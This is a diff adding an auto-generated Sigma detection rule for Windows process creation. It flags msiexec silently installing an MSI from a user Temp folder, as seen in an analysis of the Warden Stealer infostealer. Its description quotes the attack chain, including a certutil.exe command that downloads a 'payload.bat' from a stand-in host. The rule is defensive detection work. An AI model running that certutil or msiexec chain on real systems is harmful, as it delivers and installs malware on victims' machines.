@@ -1,0 +1,24 @@
+title: 'Command the source shows being run: msiexec /i C:\Users\user\AppData\Local\Temp\000013370.msi'
+id: 53534c5f-752f-49be-85c1-d5d1552f8223
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "msiexec /i "C:\Users\user\AppData\Local\Temp\000013370.msi"
+  /qn /norestart BAT: cmd.exe /c certutil.exe -urlcache -split -f "https://example.com/payload.bat"".'
+references:
+- https://www.gendigital.com/blog/insights/research/warden-stealer-rust-infostealer-analysis
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-15'
+tags:
+- attack.t1218.007
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: \msiexec.exe
+    CommandLine|contains: /i C:\Users\user\AppData\Local\Temp\000013370.msi
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hunt_id: H-0779
